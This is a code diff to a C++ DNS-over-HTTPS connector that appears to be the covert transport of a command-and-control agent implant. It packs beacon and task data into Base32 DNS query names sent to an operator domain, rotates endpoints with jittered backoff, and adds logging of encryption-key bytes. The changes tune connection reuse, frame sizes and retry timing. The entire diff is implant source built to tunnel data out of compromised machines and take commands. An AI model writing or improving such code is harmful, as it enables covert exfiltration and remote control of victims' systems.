@@ -308,6 +308,7 @@ void ConnectorDoH::CloseConnector()
         this->functions->InternetCloseHandle(this->hConnect);
         this->hConnect = NULL;
     }
+    this->connectedUrlIndex = 0xFFFFFFFF;
     if (this->hInternet) {
         this->functions->InternetCloseHandle(this->hInternet);
         this->hInternet = NULL;
@@ -318,6 +319,8 @@ void ConnectorDoH::UpdateUrls(BYTE* urls)
 {
 	this->profile.urls = urls;
 
+	// URL list changed, invalidate current connection
+	this->connectedUrlIndex = 0xFFFFFFFF;
 	this->urlCount = 0;
 	ZeroMemory(this->rawUrls, sizeof(this->rawUrls));
 	for (ULONG i = 0; i < 16; ++i) {
@@ -529,23 +532,28 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
             port = (INTERNET_PORT)atoi(colon + 1);
         }
 
-        // Always create a new connection handle for rotation
-        if (this->hConnect) {
-            this->functions->InternetCloseHandle(this->hConnect);
-            this->hConnect = NULL;
-        }
-
-        this->hConnect = this->functions->InternetConnectA(this->hInternet, hostName, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-        if (!this->hConnect) {
-            DohConnectorLog("[DoH] HTTP: InternetConnectA failed, rotating URL");
-            this->urlFailCount[idx]++;
-            if (this->urlFailCount[idx] >= 3) {
-                ULONG backoff = 60000;
-                ULONG jitter = GetTickCount() & 0x1FFF;
-                this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
-                this->urlFailCount[idx] = 0;
+        // Connection reuse: only create new connection if URL index changed or no connection exists
+        if (this->connectedUrlIndex != idx || !this->hConnect) {
+            if (this->hConnect) {
+                this->functions->InternetCloseHandle(this->hConnect);
+                this->hConnect = NULL;
             }
-            continue;
+
+            this->hConnect = this->functions->InternetConnectA(this->hInternet, hostName, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+            if (!this->hConnect) {
+                DohConnectorLog("[DoH] HTTP: InternetConnectA failed, rotating URL");
+                this->connectedUrlIndex = 0xFFFFFFFF; // Mark as no valid connection
+                this->urlFailCount[idx]++;
+                if (this->urlFailCount[idx] >= 2) {
+                    ULONG backoff = 30000;
+                    ULONG jitter = GetTickCount() & 0x0FFF;
+                    this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
+                    this->urlFailCount[idx] = 0;
+                }
+                continue;
+            }
+            this->connectedUrlIndex = idx; // Track which URL this connection is for
+            DohConnectorLog("[DoH] HTTP: new connection established");
         }
 
         DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES;
@@ -555,9 +563,9 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
         if (!hRequest) {
             DohConnectorLog("[DoH] HTTP: HttpOpenRequestA failed, rotating URL");
             this->urlFailCount[idx]++;
-            if (this->urlFailCount[idx] >= 3) {
-                ULONG backoff = 60000;
-                ULONG jitter = GetTickCount() & 0x1FFF;
+            if (this->urlFailCount[idx] >= 2) {
+                ULONG backoff = 30000;
+                ULONG jitter = GetTickCount() & 0x0FFF;
                 this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
                 this->urlFailCount[idx] = 0;
             }
@@ -651,6 +659,7 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
 		this->functions->InternetCloseHandle(this->hConnect);
 		this->hConnect = NULL;
 	}
+	this->connectedUrlIndex = 0xFFFFFFFF; // Reset connection tracking
 	if (this->hInternet) {
 		this->functions->InternetCloseHandle(this->hInternet);
 		this->hInternet = NULL;
@@ -923,21 +932,22 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 	CHAR qname[512] = { 0 };
 
 	// -------------------------------------------------------------------------
-	// 1. HI Phase: first call with non-empty data sends a small beat
+	// 1. HI Phase: use CACHED hiBeat (from SetConfig), NOT the incoming data!
+	//    This is critical for transport switching - the incoming data may be
+	//    a task response, not the agent beat.
 	// -------------------------------------------------------------------------
-	if (!this->hiSent && data && data_size) {
-		DohConnectorLog("[DoH] SendData: HI phase start");
-		// 60 bytes raw -> 96 chars Base32. With prefix + domain this keeps
-		// QNAME well under the 253-byte DNS limit.
-		const ULONG maxSafeFrame = 60;
-		ULONG maxBuf = pkt;
+	if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
+		DohConnectorLog("[DoH] SendData: HI phase start (using cached hiBeat)");
+		// DoH can handle larger frames than raw DNS since data is in HTTP body.
+		// 100 bytes raw -> ~160 chars Base32. With prefix + domain (~55 chars)
+		// this keeps QNAME safely under the 253-byte DNS limit.
+		const ULONG maxSafeFrame = 100;
+		ULONG maxBuf = this->hiBeatSize;
 		if (maxBuf > maxSafeFrame)
 			maxBuf = maxSafeFrame;
-		if (data_size && maxBuf > data_size)
-			maxBuf = data_size;
 		{
 			CHAR dbg[128];
-			_snprintf(dbg, sizeof(dbg), "[DoH] HI: pkt=%lu data=%lu maxBuf=%lu", (unsigned long)pkt, (unsigned long)data_size, (unsigned long)maxBuf);
+			_snprintf(dbg, sizeof(dbg), "[DoH] HI: cachedBeat=%lu maxBuf=%lu", (unsigned long)this->hiBeatSize, (unsigned long)maxBuf);
 			DohConnectorLog(dbg);
 		}
 		if (maxBuf == 0) {
@@ -948,7 +958,18 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
 			if (!encBuf)
 				return;
-			memcpy(encBuf, data, maxBuf);
+			// Use cached hiBeat, NOT incoming data!
+			memcpy(encBuf, this->hiBeat, maxBuf);
+
+			// DEBUG: Log HI beat data
+			{
+				CHAR hexDbg[128];
+				_snprintf(hexDbg, sizeof(hexDbg), "[DoH] HI DEBUG: Key=%02X%02X%02X%02X Data=%02X%02X%02X%02X", 
+					this->encryptKey[0], this->encryptKey[1], this->encryptKey[2], this->encryptKey[3],
+					encBuf[0], encBuf[1], encBuf[2], encBuf[3]);
+				DohConnectorLog(hexDbg);
+			}
+
 			memset(dataLabel, 0, sizeof(dataLabel));
 			if (!DnsBuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
 				MemFreeLocal((LPVOID*)&encBuf, maxBuf);
@@ -956,22 +977,18 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			}
 			MemFreeLocal((LPVOID*)&encBuf, maxBuf);
 
-			// Cache original HI beat for smart retries
-			this->hiBeatSize = maxBuf;
-			if (!this->hiBeat) {
-				this->hiBeat = (BYTE*)MemAllocLocal(this->hiBeatSize);
-				if (this->hiBeat)
-					memcpy(this->hiBeat, data, this->hiBeatSize);
-			}
-
 			DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
 			BYTE tmp[512];
 			ULONG tmpSize = 0;
 			if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
 				this->hiSent = TRUE;
+				DohConnectorLog("[DoH] HI sent successfully");
 			}
 			else if (this->hiRetries > 0) {
 				this->hiRetries--;
+				CHAR retryDbg[64];
+				_snprintf(retryDbg, sizeof(retryDbg), "[DoH] HI failed, retries left: %lu", (unsigned long)this->hiRetries);
+				DohConnectorLog(retryDbg);
 			}
 		}
 		return;
@@ -991,7 +1008,8 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 		maxChunk -= headerSize;
 
 		// Enforce QNAME length safety via maxSafeFrame
-		const ULONG maxSafeFrame = 60;
+		// DoH can handle larger frames - 100 bytes keeps QNAME under 253 limit
+		const ULONG maxSafeFrame = 100;
 		if (maxChunk + headerSize > maxSafeFrame)
 			maxChunk = maxSafeFrame - headerSize;
 
@@ -1121,10 +1139,10 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			}
 		}
 
-		ULONG maxBuf = pkt;
+		const ULONG maxSafeFrame = 100;
 		ULONG retrySize = this->hiBeatSize;
-		if (retrySize > maxBuf)
-			retrySize = maxBuf;
+		if (retrySize > maxSafeFrame)
+			retrySize = maxSafeFrame;
 		BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
 		if (!encBuf)
 			return;
@@ -1491,11 +1509,21 @@ void ConnectorDoH::ReportProtocolResult(BOOL success)
 		return;
 	}
 	this->urlFailCount[idx]++;
-	const ULONG max_fail = 3;
+	const ULONG max_fail = 2;
 	if (this->urlFailCount[idx] >= max_fail) {
-		ULONG backoff = 60000;
-		ULONG jitter = GetTickCount() & 0x1FFF;
+		ULONG backoff = 30000;
+		ULONG jitter = GetTickCount() & 0x0FFF;
 		this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
 		this->urlFailCount[idx] = 0;
 	}
+}
+
+BOOL ConnectorDoH::IsBusy() const
+{
+	BOOL busy = (this->downBuf != NULL) || this->hasPendingTasks;
+	// Debug log when busy to help diagnose burst mode issues
+	if (busy) {
+		DohConnectorLog("[DoH] IsBusy=TRUE (downBuf or hasPendingTasks)");
+	}
+	return busy;
 }
